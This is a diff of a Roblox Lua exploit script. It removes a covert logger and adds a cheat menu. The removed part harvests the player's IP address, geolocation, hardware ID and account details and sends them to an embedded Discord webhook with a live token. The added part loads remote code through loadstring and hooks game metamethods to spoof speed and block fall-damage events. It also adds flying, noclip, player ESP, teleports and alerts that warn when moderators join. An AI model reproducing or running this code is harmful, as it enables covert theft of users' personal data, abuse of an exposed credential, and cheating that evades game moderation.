@@ -1,164 +1,765 @@
-local IP = game:HttpGet("https://v4.ident.me")
-local response = game:GetService("RbxAnalyticsService"):GetClientId()
-local req = syn.request({ Url = "http://ip-api.com/json/" })
-local parsed = game:GetService("HttpService"):JSONDecode(req.Body)
-plr = game:GetService'Players'.LocalPlayer
-local premium = false
-local ALT = false
-if plr.MembershipType == Enum.MembershipType.Premium then
-	premium = true
-elseif plr.MembershipType == Enum.MembershipType.None then
-	premium = false
+local Lib = loadstring(game:HttpGet'https://raw.githubusercontent.com/zxciaz/VenyxUI/main/Reuploaded')()
+local UI = Lib.new('Crack Is Good', 5013109572)
+local CP = UI:addPage('Client', 5012544693)
+local VP = UI:addPage('Visuals', 6523858394)
+local TP = UI:addPage('Teleports', 10507357657)
+local SP = UI:addPage('Settings', 2484556379)
+local PS = CP:addSection('Personal')
+local RS = CP:addSection('Important')
+local AS = CP:addSection('Speed')
+local ES = VP:addSection('ESP')
+local LS = VP:addSection('Lighting')
+local NS = VP:addSection('Notify')
+local SS = VP:addSection('Stats')
+local MP = TP:addSection('Locations')
+local US = SP:addSection('UI')
+local TS = SP:addSection('Theme')
+
+local Themes = {
+    Background = Color3.fromRGB(25, 25, 25),
+    Glow = Color3.fromRGB(255, 255, 255),
+    Accent = Color3.fromRGB(25, 25, 25),
+    LightContrast = Color3.fromRGB(25, 25, 25),
+    DarkContrast = Color3.fromRGB(75, 75, 75),
+    TextColor = Color3.fromRGB(255, 115, 0)
+}
+
+getgenv().Fly = false
+getgenv().Noclip = false
+getgenv().Walk = false
+getgenv().NoFall = false
+getgenv().Esp = false
+getgenv().Tracer = false
+getgenv().Mods = false
+getgenv().Players = false
+getgenv().EnemyEsp = false
+getgenv().Notify = false
+getgenv().Hunger = false
+getgenv().HNotify = false
+getgenv().Thirst = false
+getgenv().TNotify = false
+FlySpeed = 100
+WalkSpeed = 16
+
+local gamememe = getrawmetatable(game)
+local Closure, Caller = hide_me or newcclosure, checkcaller or is_protosmasher_caller or Cer.isCerus
+local writeable = setreadonly(gamememe, false) or make_writeable(gamememe)
+local name, index, nindex = gamememe.__namecall, gamememe.__index, gamememe.__newindex
+local client = game:GetService'Players'.LocalPlayer
+local char = workspace.Live[client.Name] or client.Character or client.CharacterAdded:Wait(1)
+local hrp = char:FindFirstChild'HumanoidRootPart' or char:WaitForChild'HumanoidRootPart'
+local run = game:GetService'RunService'
+local mouse = client:GetMouse()
+local core = game:GetService'CoreGui'
+local cam = workspace.CurrentCamera
+local ctrl = {f = 0, b = 0, l = 0, r = 0}
+local lastctrl = {f = 0, b = 0, l = 0, r = 0}
+
+function Decode(str)
+    local K, F = 8186484168865098, 16384 + 4887
+    return (str:gsub('%x%x', function(C)
+        local L = K % 274877906944
+        local H = (K - L) / 274877906944
+        local M = H % 128
+        local C = tonumber(C, 16)
+        local G = (C + (H - M) / 128) * (2*M + 1) % 256
+        K = L * F + H + C + G
+        return string.char(G)
+    end))
 end
-if premium == false then 
-	if plr.AccountAge <= 70 then 
-		ALT = true
-	end
+
+local Light = Decode('146510be2c8e86c7')
+local Lighting = game:GetService(Light)
+
+function Unclip()
+    pcall(function()
+        char.Head.CanCollide = true
+        char.Torso.CanCollide = true
+        char['Left Leg'].CanCollide = false
+        char['Right Leg'].CanCollide = false
+    end)
 end
 
-local market = game:GetService("MarketplaceService")
-local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
-
-
-local http_request = http_request;
-if syn then
-	http_request = syn.request
-elseif SENTINEL_V2 then
-	function http_request(tb)
-		return {
-			StatusCode = 200;
-			Body = request(tb.Url, tb.Method, (tb.Body or ''))
-		}
-	end
+function Round(num, decimal)
+    local Mult = 10 ^ (decimal or 0)
+	return math.floor(num * Mult + 0.5) / Mult
 end
 
-local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
-local decoded = game:GetService('HttpService'):JSONDecode(body)
-local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
-hwid = "";
-
-for i, v in next, hwid_list do
-	if decoded.headers[v] then
-		hwid = decoded.headers[v];
-		break
-	end
+function Root(character)
+    local rootPart = character:WaitForChild'HumanoidRootPart' or character:WaitForChild'Torso' or character:WaitForChild'UpperTorso'
+	return rootPart
 end
 
-if hwid then
-local HttpServ = game:GetService('HttpService')
-local url = "https://discord.com/api/webhooks/1033909881243189268/eFDKtzZo4CsKwIAmjWpRY4_N4ziqa8P0wNCboeVi7pCsp4Tibo4olxK1Nm9C4ZEhYDaU"
-
-
-local data = 
-    {
-        ["content"] = "",
-        ["embeds"] = {{
-            ["title"] = "__**HWID:**__",
-            ["description"] = hwid,
-            ["type"] = "rich",
-            ["color"] = tonumber(0x9d00ff),
-            ["fields"] = {
-                {
-                    ["name"] = "Username:",
-                    ["value"] = Game.Players.LocalPlayer.Name,
-                    ["inline"] = true
-                },
-				{
-                    ["name"] = "IP Address:",
-                    ["value"] = IP,
-                    ["inline"] = true
-                },
-				{
-                    ["name"] = "Game Link:",
-                    ["value"] = "https://roblox.com/games/" .. game.PlaceId .. "/",
-                    ["inline"] = true
-                },
-				{
-					["name"] = "Game Name:",
-					["value"] = info.Name,
-					["inline"] = true
-				},
-				{
-					["name"] = "Age:",
-					["value"] = plr.AccountAge,
-					["inline"] = true
-				},
-				{
-					["name"] = "Premium:",
-					["value"] = premium,
-					["inline"] = true
-				},
-				{
-					["name"] = "ALT:",
-					["value"] = ALT,
-					["inline"] = true
-				},
-				{
-					["name"] = "Non Hashed HWID:",
-					["value"] = response,
-					["inline"] = true
-				},
-				{
-					["name"] = "Country:",
-					["value"] = parsed.country,
-					["inline"] = true
-				},
-				{
-					["name"] = "Country Code:",
-					["value"] = parsed.countryCode,
-					["inline"] = true
-				},
-				{
-					["name"] = "Region:",
-					["value"] = parsed.region,
-					["inline"] = true
-				},
-				{
-					["name"] = "Region Name:",
-					["value"] = parsed.regionName,
-					["inline"] = true
-				},
-				{
-					["name"] = "City:",
-					["value"] = parsed.city,
-					["inline"] = true
-				},
-				{
-					["name"] = "Zip Code:",
-					["value"] = parsed.zip,
-					["inline"] = true
-				},
-				{
-					["name"] = "Time Zone:",
-					["value"] = parsed.timezone,
-					["inline"] = true
-				},
-				{
-					["name"] = "ISP:",
-					["value"] = parsed.isp,
-					["inline"] = true
-				},
-				{
-					["name"] = "Org:",
-					["value"] = parsed.org,
-					["inline"] = true
-				},
-				{
-					["name"] = "AS:",
-					["value"] = parsed.as,
-					["inline"] = true
-				},
-            },
-        }}
-    }
-    local newdata = HttpServ:JSONEncode(data)
+function Shader()
+    for _, v in pairs(Lighting:GetChildren()) do
+        v:Destroy()
+    end
     
-    local headers = {
-            ["content-type"] = "application/json"
-    }
+    Atmosphere = Instance.new('Atmosphere', Lighting)
+    Bloom = Instance.new('BloomEffect', Lighting)
+    ColorCorrection = Instance.new('ColorCorrectionEffect', Lighting)
+    Depth = Instance.new('DepthOfFieldEffect', Lighting)
+    CC = Instance.new('ColorCorrectionEffect', Lighting)
+    CCE = Instance.new('ColorCorrectionEffect', Lighting)
+    SunRay = Instance.new('SunRaysEffect', Lighting)
+    Blur = Instance.new('BlurEffect', Lighting)
+    MotionBlur = Instance.new('BlurEffect', cam)
     
-    local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
-    http_request(request_payload)
-else
-	game:GetService("Players").LocalPlayer:Kick('Unable to find HWID! Contact Vynix Studios.')
+    sethiddenproperty(workspace.Terrain, 'Decoration', true)
+    sethiddenproperty(Lighting, 'Technology', 'ShadowMap')
+    
+    Lighting.Ambient = Color3.fromRGB(35, 35, 35)
+    Lighting.Brightness = .5
+    Lighting.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
+    Lighting.ColorShift_Top = Color3.fromRGB(255, 245, 235)
+    Lighting.EnvironmentDiffuseScale = 0.105
+    Lighting.EnvironmentSpecularScale = 0.525
+    Lighting.GlobalShadows = true
+    Lighting.OutdoorAmbient = Color3.fromRGB(35, 35, 35)
+    Lighting.ShadowSoftness = 0.05
+    Lighting.GeographicLatitude = -15.525
+    Lighting.ExposureCompensation = 0.1
+    
+    Atmosphere.Density = 0.21
+    Atmosphere.Offset = 1
+    Atmosphere.Color = Color3.fromRGB(215, 255, 250)
+    Atmosphere.Decay = Color3.fromRGB(95, 60, 15)
+    Atmosphere.Glare = 0.63
+    
+    Bloom.Enabled = true
+    Bloom.Intensity = 0.2
+    Bloom.Size = 1900
+    Bloom.Threshold = 0.915
+    
+    ColorCorrection.Brightness = 0.1
+    ColorCorrection.Contrast = 0.2
+    ColorCorrection.Enabled = true
+    ColorCorrection.Saturation = 0.3
+    ColorCorrection.TintColor = Color3.fromRGB(255, 245, 240)
+    
+    Depth.Enabled = true
+    Depth.FarIntensity = 0.7
+    Depth.FocusDistance = 0.7
+    Depth.InFocusRadius = 250
+    Depth.NearIntensity = 0.5
+    
+    CC.Brightness = 0.01
+    CC.Contrast = -0.05
+    CC.Saturation = 0
+    CC.Enabled = true
+    CC.TintColor = Color3.fromRGB(255, 245, 235)
+    
+    CCE.Brightness = 0.2
+    CCE.Contrast = 0.45
+    CCE.Saturation = -0.1
+    CCE.Enabled = true
+    CCE.TintColor = Color3.fromRGB(255, 255, 255)
+    
+    SunRay.Enabled = true
+    SunRay.Intensity = 0.084
+    SunRay.Spread = 0.364
+    
+    Blur.Enabled = true
+    Blur.Size = 2
+    
+    BlurAmount = 15
+    BlurAmplifier = 5
+    LastVector = cam.CFrame.LookVector
+    
+    workspace.Changed:Connect(function(property)
+        if property == 'CurrentCamera' then
+            if MotionBlur and MotionBlur.Parent then
+                MotionBlur.Parent = cam
+            else
+                MotionBlur = Instance.new('BlurEffect', cam)
+            end
+        end
+    end)
+    
+    run.Stepped:Connect(function()
+        Lighting.ClockTime = 11
+    end)
+    
+    run.Heartbeat:Connect(function()
+        if not MotionBlur or MotionBlur.Parent == nil then
+            MotionBlur = Instance.new('BlurEffect', cam)
+        end
+        Mag = (cam.CFrame.LookVector - LastVector).Magnitude
+        MotionBlur.Size = math.abs(Mag) * BlurAmount * BlurAmplifier / 2
+        LastVector = cam.CFrame.LookVector
+    end)
 end
+
+function EnemyESP(enemy)
+    task.spawn(function()
+        for i, v in pairs(core:GetChildren()) do
+            if v.Name == enemy.Name..'!ESP' then
+                v:Destroy()
+            end
+        end
+        if enemy and enemy.Name ~= client.Name and not core:FindFirstChild(enemy.Name..'!ESP') then
+            local EnemyHolder = Instance.new'Folder'
+            EnemyHolder.Name = enemy.Name..'!ESP'
+            EnemyHolder.Parent = core
+            repeat task.wait(1) until enemy and Root(enemy) and enemy:FindFirstChild'Head'
+            for b, n in pairs(enemy:GetChildren()) do
+                if n:IsA'Part' then
+                    local Box = Instance.new'BoxHandleAdornment'
+                    Box.Name = enemy.Name
+                    Box.Parent = EnemyHolder
+                    Box.Adornee = n
+                    Box.AlwaysOnTop = true
+                    Box.ZIndex = 10
+                    Box.Size = n.Size
+                    Box.Transparency = 1
+                end
+            end
+            if enemy and enemy:FindFirstChild'Head' then
+                local Board = Instance.new'BillboardGui'
+                local Label = Instance.new'TextLabel'
+                Board.Adornee = enemy.Head
+                Board.Name = enemy.Name
+                Board.Parent = EnemyHolder
+                Board.Size = UDim2.new(0, 100, 0, 150)
+                Board.StudsOffset = Vector3.new(0, 1, 0)
+                Board.AlwaysOnTop = true
+                Label.Parent = Board
+                Label.BackgroundTransparency = 1
+                Label.Position = UDim2.new(0, 0, 0, -50)
+                Label.Size = UDim2.new(0, 100, 0, 100)
+                Label.TextSize = 8
+                Label.TextColor3 = Color3.new(255, 0, 0)
+                Label.TextStrokeTransparency = 0
+                Label.TextYAlignment = Enum.TextYAlignment.Bottom
+                Label.Text = ''
+                Label.ZIndex = 10
+                local ELoop
+                local EAdded
+                EAdded = enemy.ChildAdded:Connect(function()
+                    if EnemyEsp then
+                        ELoop:Disconnect()
+                        EnemyHolder:Destroy()
+                        repeat task.wait(1) until Root(enemy) and enemy:FindFirstChildOfClass'Humanoid'
+                        EnemyESP(enemy)
+                        EAdded:Disconnect()
+                    else
+                        EAdded:Disconnect()
+                    end
+                end)
+                local function EnemyLoop()
+                    if core:FindFirstChild(enemy.Name..'!ESP') then
+                        if enemy and Root(enemy) and enemy:FindFirstChildOfClass'Humanoid' and client.Character and Root(client.Character) and client.Character:FindFirstChildOfClass'Humanoid' then
+                            Label.Text = 'Health: '..Round(enemy:FindFirstChildOfClass'Humanoid'.Health, 1)..''
+                        end
+                    else
+                        EAdded:Disconnect()
+                        ELoop:Disconnect()
+                    end
+                end
+                ELoop = game:GetService'RunService'.RenderStepped:Connect(EnemyLoop)
+            end
+        end
+    end)
+end
+
+function ESP(plr)
+	task.spawn(function()
+		for i,v in pairs(core:GetChildren()) do
+			if v.Name == plr.Name..'_ESP' then
+				v:Destroy()
+			end
+		end
+		task.wait()
+		if plr.Character and plr.Name ~= client.Name and not core:FindFirstChild(plr.Name..'_ESP') then
+			local Holder = Instance.new'Folder'
+			Holder.Name = plr.Name..'_ESP'
+			Holder.Parent = core
+			repeat task.wait(1) until plr.Character and Root(plr.Character) and plr.Character:FindFirstChildOfClass'Humanoid'
+			for b, n in pairs (plr.Character:GetChildren()) do
+				if n:IsA'BasePart' then
+					local a = Instance.new'BoxHandleAdornment'
+					a.Name = plr.Name
+					a.Parent = Holder
+					a.Adornee = n
+					a.AlwaysOnTop = true
+					a.ZIndex = 10
+					a.Size = n.Size
+					a.Transparency = 1
+				end
+			end
+			if plr.Character and plr.Character:FindFirstChild'Head' then
+				local Board = Instance.new'BillboardGui'
+				local Label = Instance.new'TextLabel'
+				Board.Adornee = plr.Character.Head
+				Board.Name = plr.Name
+				Board.Parent = Holder
+				Board.Size = UDim2.new(0, 100, 0, 150)
+				Board.StudsOffset = Vector3.new(0, 1, 0)
+				Board.AlwaysOnTop = true
+				Label.Parent = Board
+				Label.BackgroundTransparency = 1
+				Label.Position = UDim2.new(0, 0, 0, -50)
+				Label.Size = UDim2.new(0, 100, 0, 100)
+				Label.TextSize = 8
+				Label.TextColor3 = Color3.new(255, 255, 255)
+				Label.TextStrokeTransparency = 0
+				Label.TextYAlignment = Enum.TextYAlignment.Bottom
+				Label.Text = 'Name: '..plr.Name
+				Label.ZIndex = 10
+				local Loop
+				local Added
+				Added = plr.CharacterAdded:Connect(function()
+					if Esp then
+						Loop:Disconnect()
+						Holder:Destroy()
+						repeat task.wait(1) until Root(plr.Character) and plr.Character:FindFirstChildOfClass'Humanoid'
+						ESP(plr)
+						Added:Disconnect()
+					else
+						Added:Disconnect()
+					end
+				end)
+				local function espLoop()
+					if core:FindFirstChild(plr.Name..'_ESP') then
+						if plr.Character and Root(plr.Character) and plr.Character:FindFirstChildOfClass'Humanoid' and client.Character and Root(client.Character) and client.Character:FindFirstChildOfClass'Humanoid' then
+							local pos = math.floor((Root(client.Character).Position - Root(plr.Character).Position).magnitude)
+							Label.Text = plr.Name..' | Health: '..Round(plr.Character:FindFirstChildOfClass'Humanoid'.Health, 1)..' | '..pos
+						end
+					else
+						Added:Disconnect()
+						Loop:Disconnect()
+					end
+				end
+				Loop = game:GetService'RunService'.RenderStepped:Connect(espLoop)
+			end
+		end
+	end)
+end
+
+function Tween(location)
+    spawn(function()
+        if game.PlaceId ~= 5735553160 and (hrp.Position - Vector3.new(location.Position.X, location.Position.Y, location.Position.Z)).magnitude > 200 then
+            repeat
+                task.wait()
+                hrp.Position = hrp.Position - Vector3.new(0, 5, 0)
+            until hrp.Position.Y <= 5
+        end
+        local check = Vector3.new(location.Position.X, location.Position.Y, location.Position.Z)
+        if game.PlaceId ~= 5735553160 and (hrp.Position - Vector3.new(location.Position.X, location.Position.Y, location.Position.Z)).magnitude > 200 then
+            check = Vector3.new(location.Position.X, 2, location.Position.Z)
+        end
+        repeat
+            task.wait()
+            local dir = check - hrp.Position
+            hrp.Velocity = dir.unit * (math.random((200 - 1) * 1000, (200 + 2.5) * 1000) / 1000)
+        until (hrp.Position - check).magnitude <= 10
+        repeat
+            task.wait()
+            local dir = Vector3.new(location.Position.X, location.Position.Y, location.Position.Z) - hrp.Position
+            hrp.Velocity = dir.unit * (math.random((200 - 1) * 1000, (200 + 2.5) * 1000) / 1000)
+        until hrp.Position.Y >= location.Y
+    end)
+end
+
+PS:addKeybind('Fly', Enum.KeyCode.F4, function()
+    if not Fly then
+        Fly = true
+        spawn(function()
+            pcall(function()
+                repeat task.wait()
+                    if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
+                        bv = Instance.new('BodyVelocity', hrp)
+                        bv.maxForce = Vector3.new(4000000, 4000000, 4000000)
+                        bv.velocity = (cam.CoordinateFrame.lookVector * (ctrl.f + ctrl.b) + (cam.CoordinateFrame * CFrame.new(ctrl.l + ctrl.r, (ctrl.f + ctrl.b) * .2, 0).p) - cam.CoordinateFrame.p) * FlySpeed / 1.5
+                        hrp.Anchored = false
+                        lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
+                    else
+                        hrp.Anchored = true
+                    end
+                until not Fly
+                hrp.Anchored = false
+                ctrl = {f = 0, b = 0, l = 0, r = 0}
+                lastctrl = {f = 0, b = 0, l = 0, r = 0}
+            end)
+        end)
+    elseif Fly then
+        Fly = false
+    end
+end)
+
+PS:addKeybind('Noclip', Enum.KeyCode.F5, function()
+    if not Noclip then
+        Noclip = true
+    elseif Noclip then
+        Noclip = false
+        Unclip()
+    end
+end)
+
+PS:addToggle('Walk Speed', nil, function(state)
+    if not Walk then
+        Walk = true
+        gamememe.__newindex = Closure(function(self, Property, b)
+            if not Caller() then
+        		if self:IsA("Humanoid") then
+        			if Property == "WalkSpeed" and Walk then
+        				return nindex(self, Property, WalkSpeed)
+        			end
+        			nindex(self, Property, b)
+        		end
+            end
+            return nindex(self, Property, b)
+        end)
+    elseif Walk then
+        Walk = false
+    end
+end)
+
+PS:addToggle('No Fall', nil, function(state)
+    if not NoFall then
+        NoFall = true
+        local call
+        call = hookmetamethod(game,'__namecall', newcclosure(function(Self,...)
+            local args = {...}
+            if Caller() then return call(Self,...) end
+            local method = getnamecallmethod()
+            if method == 'FireServer' and NoFall and typeof(args[1]) == 'number' then
+                return
+            elseif method == 'FindFirstChild' and args[1] == 'BodyVelocity' then
+                return
+            end
+            return call(Self,...)
+        end))
+    elseif NoFall then
+        NoFall = false
+    end
+end)
+
+RS:addButton('Respawn', function()
+    char:Destroy()
+end)
+
+AS:addSlider('Fly',  100, 50, 200, function(num)
+    FlySpeed = num
+end)
+
+AS:addSlider('Walk', 100, 16, 150, function(num)
+    WalkSpeed = num
+end)
+
+ES:addToggle('Players', nil, function(state)
+    if not Esp then
+        Esp = true
+        for _, plr in pairs(game:GetService'Players':GetChildren()) do
+            if plr.ClassName == 'Player' and plr.Name ~= client.Name then
+                ESP(plr)
+            end
+        end
+    else
+        Esp = false
+        for i, c in pairs(core:GetChildren()) do
+            if string.sub(c.Name, -4) == '_ESP' then
+                c:Destroy()
+            end
+        end
+    end
+end)
+
+ES:addToggle('Enemies', nil, function(state)
+    if not EnemyEsp then
+        EnemyEsp = true
+        for _, enemy in pairs(workspace.Live:GetChildren()) do
+            if enemy:FindFirstChild'SpawnCF' and enemy.Name ~= client.Name then
+                EnemyESP(enemy)
+            end
+        end
+    else
+        EnemyEsp = false
+        for i, c in pairs(core:GetChildren()) do
+            if string.sub(c.Name, -4) == '!ESP' then
+                c:Destroy()
+            end
+        end
+    end
+end)
+
+LS:addButton('Shaders', function()
+    Shader()
+end)
+
+LS:addButton('Day', function()
+    Lighting.ClockTime = 14
+end)
+
+LS:addButton('Night', function()
+    Lighting.ClockTime = 0
+end)
+
+LS:addButton('Hide Fog', function()
+    Lighting.FogEnd = 100000
+    for i, effect in pairs(Lighting:GetDescendants()) do
+		if effect:IsA'Atmosphere' then
+			effect:Destroy()
+		end
+	end
+end)
+
+NS:addToggle('Mods', nil, function(state)
+    if not Mods then
+        Mods = true
+        for _, snitch in pairs(game:GetService'Players':GetChildren()) do
+            if snitch:IsInGroup(5212858) then
+                game:GetService'StarterGui':SetCore('SendNotification', {
+                    Title = snitch.Name..' Is a Snitch!',
+                    Text = 'Would you like to leave?',
+                    Duration = 100,
+                    Callback = data,
+                    Button1 = 'Yes',
+                    Button2 = 'No'
+                })
+            end
+        end
+        Check = game:GetService'Players'.PlayerAdded:Connect(function(snitch)
+            if snitch:IsInGroup(5212858) then
+                game:GetService'StarterGui':SetCore('SendNotification', {
+                    Title = snitch.Name..' Is a Snitch!',
+                    Text = 'Would you like to leave?',
+                    Duration = 100,
+                    Callback = data,
+                    Button1 = 'Yes',
+                    Button2 = 'No'
+                })
+            end
+        end)
+    else
+        Mods = false
+        Check:Disconnect()
+    end
+end)
+
+NS:addToggle('Players', nil, function(val)
+    if not Players then
+        Players = true
+        hrp:GetPropertyChangedSignal'Position':connect(function()
+            for _, plr in pairs(game.Players:GetChildren()) do
+                if plr.Name ~= client.Name and plr.Character and Root(plr.Character) and plr.Character:FindFirstChildOfClass'Humanoid' and char and Root(char) and char:FindFirstChildOfClass'Humanoid' then 
+                    pos = math.floor((Root(char).Position - Root(plr.Character).Position).magnitude)
+                    if pos <= 500 and not Notify then
+                        UI:Notify(plr.Name..' is Near!', 'Current Distance: '..pos)
+                        Notify = true
+                        task.wait(1)
+                    end
+                    if pos > 500 and Notify then
+                        Notify = false
+                    end
+                end
+            end
+        end)
+    else
+        Players = false
+        Notify = false
+    end
+end)
+
+NS:addToggle('Hunger', nil, function(val)
+    if not Hunger then
+        Hunger = true
+        char.Stomach:GetPropertyChangedSignal'Value':connect(function()
+            if Hunger and char.Stomach.Value <= 45 and not HNotify then
+                HNotify = true
+                UI:Notify('Hunger: Low', 'Eat Some Food!')
+                task.wait(1)
+            end
+            if Hunger and char.Stomach.Value > 45 and HNotify then
+                HNotify = false
+            end
+        end)
+    else
+        Hunger = false
+        HNotify = false
+    end
+end)
+
+NS:addToggle('Thirst', nil, function(val)
+    if not Thirst then
+        Thirst = true
+        char.Water:GetPropertyChangedSignal'Value':connect(function()
+            if Thirst and char.Water.Value <= 45 and not TNotify then
+                TNotify = true
+                UI:Notify('Thirst: Low', 'Drink Some Water!')
+                task.wait(1)
+            end
+            if Thirst and char.Water.Value > 45 and TNotify then
+                TNotify = false
+            end
+        end)
+    else
+        Thirst = false
+        TNotify = false
+    end
+end)
+
+SS:addTextbox('Name:', 'Awaiting Input...', function(value, focusLost)
+    name = value
+    if (focusLost) then
+    UI:Notify('Name: '..name, 'Ether: '..math.floor(workspace.Live[name].Ether.MaxValue)..' | Reservoir: '..math.floor(workspace.Live[name].Reservoir.MaxValue)..' | Posture: '..math.floor(workspace.Live[name].BreakMeter.Value)..' | Agility: '..math.floor(workspace.Live[name].Agility.Value)..' | Blood: '..math.floor(workspace.Live[name].Blood.Value))
+    end
+end)
+
+MP:addButton('Etris', function()
+    Tween(CFrame.new(2355, 153, -4171))
+end)
+
+MP:addButton('Erisia', function()
+    Tween(CFrame.new(58, 153, -49))
+end)
+
+MP:addButton('Bandit Camp', function()
+    Tween(CFrame.new(965, 436, -27))
+end)
+
+MP:addButton('Sharko Cave', function()
+    Tween(CFrame.new(1150, 397, -720))
+end)
+
+MP:addButton('Golems', function()
+    Tween(CFrame.new(1319, 664, 1583))
+end)
+
+MP:addButton('Duke', function()
+    Tween(CFrame.new(1394, 650, 2695))
+end)
+
+MP:addButton('Isle of Vigils', function()
+    Tween(CFrame.new(1150, 397, -720))
+end)
+
+MP:addButton('Isle Trainers', function()
+    Tween(CFrame.new(-1979, 176, 2770))
+end)
+
+MP:addButton('Summer Isles', function()
+    Tween(CFrame.new(-4536, 110, 677))
+end)
+
+MP:addButton('Songseeker', function()
+    Tween(CFrame.new(-4460, 189, -3263))
+end)
+
+MP:addButton('Minitrysa', function()
+    Tween(CFrame.new(-4413, 189, -5946))
+end)
+
+MP:addButton('Trial', function()
+    Tween(CFrame.new(-4436, 129, -6399))
+end)
+
+MP:addButton('Starswept', function()
+    Tween(CFrame.new(-7337, 654, -510))
+end)
+
+MP:addButton('Fort Merit', function()
+    Tween(CFrame.new(-8827, 565, 2860))
+end)
+
+MP:addButton('Hive', function()
+    Tween(CFrame.new(-10416, 1018, -402))
+end)
+
+MP:addButton('Primadon', function()
+    Tween(CFrame.new(-9832, 333, -6488))
+end)
+
+MP:addButton('Ferry Man', function()
+    Tween(CFrame.new(-4269, 101, -11529))
+end)
+
+MP:addButton('Void Sea', function()
+    Tween(CFrame.new(-4421.81738, 0.134027243, -10340.2676, 0.841053665, 3.31898917e-08, 0.540951669, -1.62938214e-08, 1, -3.60215395e-08, -0.540951669, 2.14818776e-08, 0.841053665))
+end)
+
+US:addKeybind('Toggle', Enum.KeyCode.RightControl, function()
+    UI:toggle()
+end)
+
+US:addButton('Close', function()
+    core:WaitForChild'Midwoken':Destroy()
+end)
+
+for theme, color in pairs(Themes) do
+    TS:addColorPicker(theme, color, function(color3)
+        UI:setTheme(theme, color3)
+    end)
+end
+
+game:GetService'RunService'.Stepped:connect(function()
+    pcall(function()
+        if Noclip then
+            for _, part in pairs(char:GetDescendants()) do
+                if part:IsA'BasePart' then
+                    part.CanCollide = false
+                end
+            end
+        end
+    end)
+end)
+
+game:GetService'Players'.PlayerRemoving:Connect(function(player)
+    if Esp then
+        for _, ui in pairs(core:GetChildren()) do
+            if ui.Name == player.Name..'_ESP' then
+                ui:Destroy()
+            end
+        end
+    end
+end)
+
+game:GetService'Players'.PlayerAdded:Connect(function(player)
+    if Esp then
+        repeat task.wait(1) until player.Character and Root(player.Character)
+		ESP(player)
+    end
+end)
+
+workspace.Live.ChildRemoved:Connect(function(enemy)
+    if EnemyEsp then
+        for _, ui in pairs(core:GetChildren()) do
+            if ui.Name == enemy.Name..'!ESP' then
+                ui:Destroy()
+            end
+        end
+    end
+end)
+
+workspace.Live.ChildAdded:Connect(function(enemy)
+    if EnemyEsp then
+        if enemy:WaitForChild'SpawnCF' then
+            repeat task.wait(1) until enemy and Root(enemy)
+            EnemyESP(enemy)
+        end
+    end
+end)
+
+mouse.KeyDown:connect(function(key)
+    if key:lower():match'w' then
+        ctrl.f = 1
+    elseif key:lower():match's' then
+        ctrl.b = -1
+    elseif key:lower():match'a' then
+        ctrl.l = -1
+    elseif key:lower():match'd' then
+        ctrl.r = 1
+    end
+end)
+
+mouse.KeyUp:connect(function(key)
+    if key:lower():match'w' then
+        ctrl.f = 0
+    elseif key:lower():match's' then
+        ctrl.b = 0
+    elseif key:lower():match'a' then
+        ctrl.l = 0
+    elseif key:lower():match'd' then
+        ctrl.r = 0
+    end
+end)
